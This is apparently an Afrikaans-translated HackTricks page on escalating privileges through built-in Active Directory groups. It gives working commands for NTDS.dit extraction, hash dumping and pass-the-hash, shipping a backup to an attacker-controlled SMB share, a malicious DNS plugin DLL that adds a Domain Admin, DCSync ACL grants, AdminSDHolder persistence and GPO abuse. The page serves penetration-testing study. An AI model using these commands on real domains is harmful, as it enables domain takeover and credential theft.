# Bevoorregte groepe

{{#include ../../banners/hacktricks-training.md}}

## Bekende groepe met administratiewe voorregte

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Dit maak ook plaaslike aanmelding by die Domain Controller (DC) moontlik.

Voer die volgende opdrag uit om die lede van hierdie groep te identifiseer:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Om nuwe gebruikers by te voeg, word toegelaat, asook plaaslike aanmelding by die DC.<sup>[[1]](#references)</sup>

'n Voorwaardelike pad van rekeningbestuur na plaaslike administratortoegang is 'n **gewone groep wat gedelegeer is om 'n rekenaar se LAPS-wagwoord te lees**. Gaan die effektiewe regte om lidmaatskap van daardie spesifieke groep te wysig na, of die groep beskerm is, en of 'n nuwe of beheerde rekening werklik daarby kan aansluit. Verfris die rekening se token voordat jy die teikenrekenaar se LAPS-leestoestemming toets. Vir geënkripteerde Windows LAPS is leestoestemming vir die gids en gesag om die wagwoord te dekripteer afsonderlike vereistes; groepslidmaatskap of lidmaatskap van Account Operators op sigself bewys nie een van die twee nie. Sien [Microsoft se omvang vir Account Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) en [Windows LAPS-delegering](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder-groep

Die Toegangsbeheerlys (ACL) van die **AdminSDHolder**-groep is van kardinale belang, aangesien dit toestemmings vir alle "beskermde groepe" binne Active Directory, insluitend groepe met hoë voorregte, bepaal. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongemagtigde wysigings te voorkom.

'n Aanvaller kan dit uitbuit deur die ACL van die **AdminSDHolder**-groep te wysig en volle toestemmings aan 'n standaardgebruiker te verleen. Dit sal daardie gebruiker in praktyk volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings verander of verwyder word, sal dit binne 'n uur outomaties herstel word weens die stelsel se ontwerp.<sup>[[14]](#references)</sup>

Onlangse Windows Server-dokumentasie behandel steeds verskeie ingeboude operateursgroepe as **beskermde** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, ens.). Die **SDProp**-proses loop by verstek elke 60 minute op die **PDC Emulator**, stel `adminCount=1` in en deaktiveer oorerwing op beskermde objekte. Dit is nuttig vir volharding én om verouderde bevoorregte gebruikers op te spoor wat uit 'n beskermde groep verwyder is, maar steeds die ACL sonder oorerwing behou.<sup>[[12]](#references)</sup>

Opdragte om die lede na te gaan en toestemmings te wysig, sluit in:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

'n Skrip is beskikbaar om die herstelproses te bespoedig: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) vir meer besonderhede.<sup>[[14]](#references)</sup>

## AD Recycle Bin

Die sigbaarheid van geskrapte voorwerpe word deur die effektiewe gidsregte beheer; 'n groepnaam alleen bewys nie dat die huidige identiteit 'n voorwerp kan lys of herstel nie. AD Recycle Bin moes voor die skrapping geaktiveer gewees het vir volledige herstel, en herstel vereis ook Reanimate-Tombstones op die naming-context root, hernoemregte en CREATE_CHILD op die bestemmingshouer. [Microsoft se riglyne vir Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) en [magtigingsreëls vir herstel van geskrapte voorwerpe](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) onderskei tussen hierdie voorwaardes. 'n Gemagtigde identiteit met leestoegang tot geskrapte voorwerpe kan rekords inspekteer wat sensitiewe inligting kan onthul:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Dit is nuttig om **vorige voorregpaaie te herstel**. Geskrapte voorwerpe kan steeds `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, ou SPN's of die DN van 'n geskrapte bevoorregte groep blootlê, wat later deur 'n ander operateur herstel kan word.

Toepassing-gedefinieerde attributes kan ook ou geloofsbr materiaal behou terwyl 'n voorwerp geskrap bly. Hanteer dit as 'n afsonderlike leidraad vir ondersoek: die huidige identiteit moet toegelaat word om die geskrapte voorwerp te enumereer **en** daardie attribute te lees, die waarde moet 'n bruikbare geloofsbr wees, en 'n steeds aktiewe principal moet dit aanvaar. Groeplidmaatskap of 'n geskrapte rekeningnaam alleen bewys nie een van hierdie stappe nie; vermy dit om geloofsbrwaardes tydens roetine-enumerasie te vertoon. [Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) beskryf die behoud van attributes ná skrapping.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Herlewing van ’n geskrapte rekening deur gedelegeerde ACL’s

’n ACL-nutsding se `WRITE`-resultaat vir ’n geskrapte rekening is ’n leidraad, nie ’n bewys dat alle toestemmings om die rekening te herstel effektief is nie.<sup>[[18]](#references)</sup> Inspekteer die geskrapte objek se ACL en `lastKnownParent` direk; BloodHound-paaie laat dalk ACL’s van geskrapte objekte weg.<sup>[[19]](#references)</sup> ’n Herstelde rekening kan sy wagwoord-hash behou, maar die herstel daarvan openbaar nie die wagwoord of verleen regte om die wagwoord terug te stel nie. Verifikasie vereis steeds ’n geldige geloofsbrief.<sup>[[19]](#references)</sup>

Om versteekte geskrapte rekeninge op te som en die herlewingsreg vanaf Linux te bevestig, gebruik `bloodyAD` met die LDAP-kontroles vir herwinde objekte en gedeaktiveerde skakels. Herstel dan die gekose rekening met sy `sAMAccountName`. Vervang die voorbeelddomein, gasheer en identiteit met dié van die geassesseerde omgewing; verifieer die teiken-DN en `lastKnownParent` voordat jy skryf.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Toegang tot domeinbeheerder

Toegang tot lêers op die DC is beperk, tensy die gebruiker deel is van die `Server Operators`-groep, wat die toegangsvlak verander.

### Privilege Escalation

Deur `PsService` of `sc` van Sysinternals te gebruik, kan diensregte nagegaan en gewysig word. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van arbitrêre opdragte en privilege escalation moontlik maak:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Hierdie opdrag wys dat `Server Operators` volle toegang het, wat die manipulering van dienste vir verhoogde voorregte moontlik maak.

## Backup Operators

Lidmaatskap van `Backup Operators` kan, afhangend van die plaaslike beleid en die logon session, `SeBackupPrivilege` en `SeRestorePrivilege` op ’n host verleen. Gaan die **effective token van die proses wat die opdragte uitvoer** na met `whoami /groups` en `whoami /priv`: lidmaatskap alleen bewys nie dat `SeBackupPrivilege` teenwoordig en geaktiveer is nie. As die voorreg teenwoordig maar gedeaktiveer is, kan dit in daardie token geaktiveer word; as dit ontbreek of verwyder is, kan hierdie rugsteunbewerkings dit nie gebruik nie. `SeBackupPrivilege` ondersteun beskermde **leesbewerkings** via backup-aware API’s (byvoorbeeld `FILE_FLAG_BACKUP_SEMANTICS` of `robocopy /B`); `SeRestorePrivilege` is ’n afsonderlike voorreg vir herstel-/skryfbewerkings. Gewone gidslyste en kopieë gebruik nie noodwendig backup semantics nie.<sup>[[1]](#references)</sup>

Voer die volgende uit om groeplede te lys:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Plaaslike aanval

Op ’n gasheer waar die effektiewe token `SeBackupPrivilege` het, kan die volgende rugsteunbewuste kopie ’n beskermde lêer lees:

1. Voer die nodige biblioteke in:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Indien die voorreg teenwoordig maar gedeaktiveer is, aktiveer dit en verifieer die status daarvan in hierdie proses:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Kopieer ’n lêer uit ’n beperkte gids, byvoorbeeld:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` is die Active Directory-databasis op ’n **domain controller (DC)**. Hierdie pad vereis ’n geskikte token op die DC en toegang tot die volume wat die databasis bevat; lidmaatskap van Backup Operators elders verleen nie toegang tot ’n spesifieke DC nie. ’n Regstreekse databasis is gewoonlik gesluit, dus gebruik ’n toeganklike shadow copy of ’n ander rugsteunfasiliteit voordat jy dit kopieer. Die skep of beskikbaar stel van ’n shadow copy hang ook af van die gasheer se VSS-opstelling en die beller se regte. Die voorbeeld hieronder neem aan dat die DC `NTDS.dit` op `C:` onder `\Windows\NTDS` stoor; pas die volume en pad aan indien dit nie die geval is nie.

#### Gebruik diskshadow.exe

1. Indien toegelaat, skep en stel ’n shadow copy van die DC se `C:`-skyf as `F:` beskikbaar:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Kopieer `NTDS.dit` vanaf die skadukopie:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatiewelik, gebruik `robocopy` om lêers te kopieer:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Stoor die DC se `SYSTEM`-hive vir vanlyn ekstraksie. `SAM` is die plaaslike rekeningdatabasis op lidstelsels; ’n DC se `SAM`-hive is nie ’n plaasvervanger vir `NTDS.dit` of ’n bron van die domein-Administrator-hash nie:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Dra `ntds.dit` en `SYSTEM.SAV` na die ontledingsgasheer oor en onttrek domeinrekening-hashes. ’n Gestoorde `SAM`-korf van ’n lidstelsel, met sy ooreenstemmende `SYSTEM`-korf, lewer eerder plaaslike rekening-hashes:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. As ’n **domein** Administrator-hash uit `NTDS.dit` herwin is, kan dit vir domeinverifikasie getoets word. ’n Plaaslike Administrator-hash uit `SAM.SAV` is ’n ander geloofsbrief en verifieer nie as die domein-Administrator nie.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Gebruik wbadmin.exe

1. Stel ’n NTFS-lêerstelsel vir die SMB-bediener op die aanvallermasjien op en kas SMB-bewyse op die teikenmasjien.
2. Gebruik `wbadmin.exe` vir stelselrugsteun en `NTDS.dit`-onttrekking:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Vir ’n praktiese demonstrasie, sien [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins**-groep kan hul voorregte uitbuit om ’n arbitrêre DLL met SYSTEM-voorregte op ’n DNS-bediener te laai, wat dikwels op Domain Controllers gehuisves word. Hierdie vermoë bied aansienlike uitbuitingspotensiaal.

Gebruik die volgende om lede van die DnsAdmins-groep te lys:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Voer arbitrêre DLL uit (CVE‑2021‑40469)

> [!NOTE]
> Hierdie kwesbaarheid laat toe dat arbitrêre kode met SYSTEM-regte in die DNS-diens uitgevoer word (gewoonlik binne die DC's). Hierdie probleem is in 2021 reggestel.

Lede kan die DNS-bediener 'n arbitrêre DLL laat laai (hetsy plaaslik of vanaf 'n afgeleë share) met opdragte soos:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Dit is nodig om die DNS-diens te herbegin (wat moontlik bykomende toestemmings vereis) sodat die DLL gelaai kan word:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Vir meer besonderhede oor hierdie aanvalvektor, verwys na ired.team.

#### Mimilib.dll

Dit is ook moontlik om mimilib.dll vir opdraguitvoering te gebruik deur dit te wysig om spesifieke opdragte of reverse shells uit te voer. [Kyk na hierdie plasing](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.<sup>[[15]](#references)</sup>

### WPAD-rekord vir MitM

DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle-aanvalle (MitM) uit te voer deur ’n WPAD-rekord te skep nadat die globale navraagblokkeringslys gedeaktiveer is. Gereedskap soos Responder of Inveigh kan gebruik word om netwerkverkeer te bedrieg en vas te lê.

### Gebeurtenisloglesers
Lede kan toegang tot gebeurtenislogboeke kry en moontlik sensitiewe inligting vind, soos wagwoorde in gewone teks of besonderhede oor opdraguitvoering:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Hierdie groep kan DACLs op die domeinobjek wysig en moontlik DCSync-voorregte verleen. Tegnieke vir privilege escalation deur hierdie groep te misbruik, word in die Exchange-AD-Privesc GitHub-repo uiteengesit.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

As jy as ’n lid van hierdie groep kan optree, is die klassieke misbruik om ’n aanvaller-beheerde principal die replikasieregte te gee wat nodig is vir [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Histories het **PrivExchange** toegang tot posbusse, gedwonge Exchange-verifikasie en LDAP-relay gekombineer om dieselfde primitiewe te verkry. Selfs waar daardie relay-pad versag is, bly direkte lidmaatskap van `Exchange Windows Permissions` of beheer oor ’n Exchange-bediener ’n waardevolle pad na domeinreplikasieregte.

## Hyper-V Administrators

Hyper-V Administrators het volle toegang tot Hyper-V, wat uitgebuit kan word om beheer oor gevirtualiseerde Domain Controllers te verkry. Dit sluit in die kloning van aktiewe DC’s en die onttrekking van NTLM-hashes uit die NTDS.dit-lêer.

### Exploitation Example

Die praktiese misbruik behels gewoonlik **vanlyn toegang tot DC-skywe/kontrolepunte**, eerder as ou LPE-toertjies op gasheervlak. Met toegang tot die Hyper-V-gasheer kan ’n operateur ’n gevirtualiseerde Domain Controller se kontrolepunt skep of dit uitvoer, die VHDX monteer en `NTDS.dit`, `SYSTEM` en ander geheime onttrek sonder om LSASS binne die gas te raak:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Van daar af, hergebruik die `Backup Operators`-werkvloei om `Windows\NTDS\ntds.dit` en die registerkorwe vanlyn te kopieer. Verwante werkvloei vir rugsteunlêers:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Hierdie groep laat lede toe om Groepbeleide in die domein te skep. Die lede daarvan kan egter nie groepbeleide op gebruikers of groepe toepas of bestaande GPO's wysig nie.

Die belangrike nuanse is dat die **skepper die eienaar van die nuwe GPO word** en gewoonlik genoeg regte kry om dit daarna te wysig. Dit beteken hierdie groep is interessant wanneer jy een van die volgende kan doen:

- 'n kwaadwillige GPO skep en 'n admin oortuig om dit aan 'n teiken-OU/domein te koppel
- 'n GPO wysig wat jy geskep het en wat reeds op 'n nuttige plek gekoppel is
- 'n ander gedelegeerde reg misbruik wat jou toelaat om GPO's te koppel, terwyl hierdie groep jou die regte gee om dit te wysig

Praktiese misbruik behels gewoonlik die byvoeging van 'n **Immediate Task**, **opstartskrip**, **lidmaatskap van plaaslike administrateurs**, of 'n verandering aan **toewysing van gebruikersregte** deur beleidslêers wat deur SYSVOL ondersteun word.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

As jy die GPO handmatig deur `SYSVOL` wysig, onthou dat die verandering op sigself nie genoeg is nie: `versionNumber`, `GPT.ini` en soms `gPCMachineExtensionNames` moet ook opgedateer word, anders sal kliënte die beleidsverversing ignoreer.<sup>[[9]](#references)</sup>

## Organisasiebestuur

In omgewings waar **Microsoft Exchange** ontplooi is, beskik ’n spesiale groep, bekend as **Organization Management**, oor aansienlike vermoëns. Hierdie groep het die voorreg om **toegang tot die posbusse van alle domeingebruikers te kry** en behou **volle beheer oor die 'Microsoft Exchange Security Groups' Organizational Unit (OU)**. Hierdie beheer sluit die **`Exchange Windows Permissions`**-groep in, wat vir voorregte-eskalasie uitgebuit kan word.

### Uitbuiting van voorregte en opdragte

#### Print Operators

Lede van die **Print Operators**-groep het verskeie voorregte, waaronder **`SeLoadDriverPrivilege`**, wat hulle toelaat om **plaaslik by ’n Domain Controller aan te meld**, dit af te sluit en drukkers te bestuur. Om hierdie voorregte uit te buit, veral as **`SeLoadDriverPrivilege`** nie in ’n nie-verhoogde konteks sigbaar is nie, is dit nodig om User Account Control (UAC) te omseil.<sup>[[1]](#references)</sup>

Die volgende PowerShell-opdrag word gebruik om die lede van hierdie groep te lys:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Op Domain Controllers is hierdie groep gevaarlik omdat die verstek Domain Controller Policy **`SeLoadDriverPrivilege`** aan `Print Operators` toeken. As jy ’n verhoogde token vir ’n lid van hierdie groep verkry, kan jy die privilege aktiveer en ’n ondertekende maar kwesbare driver laai om na kernel/SYSTEM oor te skakel.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Vir besonderhede oor tokenhantering, sien [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Lede van hierdie groep kry toegang tot rekenaars via Remote Desktop Protocol (RDP). PowerShell-opdragte is beskikbaar om hierdie lede te enumereer:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Verdere insigte oor die uitbuiting van RDP kan in toegewyde pentesting-hulpbronne gevind word.

#### Remote Management Users

Lede kan toegang tot rekenaars verkry via **Windows Remote Management (WinRM)**. Lede kan soos volg geënumereer word:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Vir uitbuitingstegnieke wat met **WinRM** verband hou, moet spesifieke dokumentasie geraadpleeg word.

#### Server Operators

Hierdie groep het toestemmings om verskeie konfigurasies op Domain Controllers uit te voer, insluitend rugsteun- en herstelvoorregte, die verandering van stelseltyd en die afskakeling van die stelsel.<sup>[[1]](#references)</sup> Die volgende opdrag word gegee om die lede op te som:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Op Domain Controllers erf `Server Operators` gewoonlik genoeg regte om **dienste te herkonfigureer of te begin/stop**, en ontvang hulle ook `SeBackupPrivilege`/`SeRestorePrivilege` deur die verstek-DC-beleid. In die praktyk maak dit hulle ’n brug tussen **misbruik van diensbeheer** en **NTDS-onttrekking**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Versuim om dienste te lys, sluit nie toegang tot ’n **bekende diens** uit nie. Die Service Control Manager kontroleer `SC_MANAGER_ENUMERATE_SERVICE` vir lysing afsonderlik van `SC_MANAGER_CONNECT`; wanneer ’n diens met ’n naam oopgemaak word, word sy eie regte nagegaan, insluitend `SERVICE_CHANGE_CONFIG` en `SERVICE_START`. Gaan die effektiewe token en daardie diens se ACL na, selfs wanneer ’n algemene `sc.exe query` misluk. Konfigurasieregte alleen is slegs ’n moontlike aanduiding: die diensidentiteit, begin-/stopregte en ’n bruikbare sneller bepaal steeds of ’n oorgang na hoër voorregte moontlik is. Sien [Microsoft se verwysing oor diens-toegangsregte](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

As ’n diens-ACL hierdie groep regte gee om die diens te verander en te begin, wys die diens na ’n arbitrêre opdrag, begin dit as `LocalSystem` en herstel dan die oorspronklike `binPath`. As diensbeheer beperk is, gebruik eerder die `Backup Operators`-tegnieke hierbo om `NTDS.dit` te kopieer.

## References

- [1] [ired.team – Bevoorregte rekeninge en token privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Misbruik van SeLoadDriverPrivilege vir voorregte-eskalasie](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Misbruik van GPO-toestemmings](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Misbruik van GPO’s, deel 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – ’n Red Teamer se gids tot GPO’s en OU’s](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver-funksie](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonieme LDAP → Wagwoord-sprei → SeBackupPrivilege → Domeinadmin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Bylaag C: Beskermde rekeninge en groepe in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Hoe om AdminSDHolder te misbruik en ’n agterdeur te gee om volgehoue domeinadmin-toegang te verkry](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Misbruik van DnsAdmins-voorregte vir eskalasie in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Inligting oor misbruik van die GenericAll-rand](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver-funksie (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Magtigingsreëls vir herstel van geskrapte items](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
